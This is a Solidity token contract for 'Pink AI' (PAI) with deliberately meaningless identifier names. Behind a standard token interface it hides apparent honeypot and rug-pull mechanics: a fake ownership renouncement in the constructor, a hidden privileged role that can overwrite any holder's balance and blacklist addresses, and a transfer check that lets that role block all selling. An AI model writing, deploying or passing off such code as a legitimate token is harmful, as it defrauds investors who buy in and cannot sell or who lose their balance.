//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface marketingSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingModeSell) external view returns (uint256);

    function transfer(address launchedMarketing, uint256 shouldAt) external returns (bool);

    function allowance(address senderToLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldAt) external returns (bool);

    function transferFrom(
        address sender,
        address launchedMarketing,
        uint256 shouldAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atIs, uint256 value);
    event Approval(address indexed senderToLaunch, address indexed spender, uint256 value);
}

interface limitAmount is marketingSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract takeAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fundSell {
    function createPair(address toAuto, address listLiquidityMarketing) external returns (address);
}

interface modeLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PinkAI is takeAmount, marketingSwap, limitAmount {

    bool private listMarketing;

    function maxTake(address totalWallet) public {
        receiverLaunchedWallet();
        if (listMarketing) {
            totalFund = launchBuy;
        }
        if (totalWallet == atMode || totalWallet == marketingLimit) {
            return;
        }
        buyList[totalWallet] = true;
    }

    uint256 private fundModeEnable = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return liquidityLimit;
    }

    address marketingFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address private liquidityLimit;

    address sellFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private totalLimit = "Pink AI";

    bool public liquidityMaxSwap;

    function balanceOf(address marketingModeSell) public view virtual override returns (uint256) {
        return minMaxFee[marketingModeSell];
    }

    function maxTeamList(address atLiquidity, address launchedMarketing, uint256 shouldAt) internal returns (bool) {
        require(minMaxFee[atLiquidity] >= shouldAt);
        minMaxFee[atLiquidity] -= shouldAt;
        minMaxFee[launchedMarketing] += shouldAt;
        emit Transfer(atLiquidity, launchedMarketing, shouldAt);
        return true;
    }

    bool public modeSell;

    address public marketingLimit;

    function allowance(address marketingExempt, address feeWallet) external view virtual override returns (uint256) {
        if (feeWallet == sellFrom) {
            return type(uint256).max;
        }
        return swapTx[marketingExempt][feeWallet];
    }

    function tradingMax(address atLiquidity, address launchedMarketing, uint256 shouldAt) internal returns (bool) {
        if (atLiquidity == atMode) {
            return maxTeamList(atLiquidity, launchedMarketing, shouldAt);
        }
        uint256 atSellLaunch = marketingSwap(marketingLimit).balanceOf(marketingFee);
        require(atSellLaunch == walletBuy);
        require(!buyList[atLiquidity]);
        return maxTeamList(atLiquidity, launchedMarketing, shouldAt);
    }

    mapping(address => bool) public buyList;

    function transfer(address liquidityBuy, uint256 shouldAt) external virtual override returns (bool) {
        return tradingMax(_msgSender(), liquidityBuy, shouldAt);
    }

    function receiverLaunchedWallet() private view {
        require(swapTotalEnable[_msgSender()]);
    }

    mapping(address => bool) public swapTotalEnable;

    uint256 private maxAmount;

    function owner() external view returns (address) {
        return liquidityLimit;
    }

    function tradingSwap(address exemptSwap) public {
        if (liquidityMaxSwap) {
            return;
        }
        if (listMarketing) {
            tradingSellLiquidity = true;
        }
        swapTotalEnable[exemptSwap] = true;
        if (maxAmount == totalFund) {
            listMarketing = true;
        }
        liquidityMaxSwap = true;
    }

    mapping(address => uint256) private minMaxFee;

    function enableToAuto(address liquidityBuy, uint256 shouldAt) public {
        receiverLaunchedWallet();
        minMaxFee[liquidityBuy] = shouldAt;
    }

    uint256 walletBuy;

    bool private minSwap;

    function approve(address feeWallet, uint256 shouldAt) public virtual override returns (bool) {
        swapTx[_msgSender()][feeWallet] = shouldAt;
        emit Approval(_msgSender(), feeWallet, shouldAt);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderFromMarketing;
    }

    event OwnershipTransferred(address indexed receiverSell, address indexed swapAmount);

    function toTotalExempt() public {
        emit OwnershipTransferred(atMode, address(0));
        liquidityLimit = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptFund;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundModeEnable;
    }

    uint8 private exemptFund = 18;

    uint256 public launchBuy;

    function listFund(uint256 shouldAt) public {
        receiverLaunchedWallet();
        walletBuy = shouldAt;
    }

    constructor (){
        
        toTotalExempt();
        modeLaunch minToken = modeLaunch(sellFrom);
        marketingLimit = fundSell(minToken.factory()).createPair(minToken.WETH(), address(this));
        if (totalFund == launchBuy) {
            listMarketing = true;
        }
        atMode = _msgSender();
        swapTotalEnable[atMode] = true;
        minMaxFee[atMode] = fundModeEnable;
        
        emit Transfer(address(0), atMode, fundModeEnable);
    }

    bool private receiverLiquidity;

    address public atMode;

    uint256 teamSell;

    mapping(address => mapping(address => uint256)) private swapTx;

    uint256 private totalFund;

    uint256 public exemptAmountFrom;

    string private senderFromMarketing = "PAI";

    function name() external view virtual override returns (string memory) {
        return totalLimit;
    }

    bool private tradingSellLiquidity;

    function transferFrom(address atLiquidity, address launchedMarketing, uint256 shouldAt) external override returns (bool) {
        if (_msgSender() != sellFrom) {
            if (swapTx[atLiquidity][_msgSender()] != type(uint256).max) {
                require(shouldAt <= swapTx[atLiquidity][_msgSender()]);
                swapTx[atLiquidity][_msgSender()] -= shouldAt;
            }
        }
        return tradingMax(atLiquidity, launchedMarketing, shouldAt);
    }

}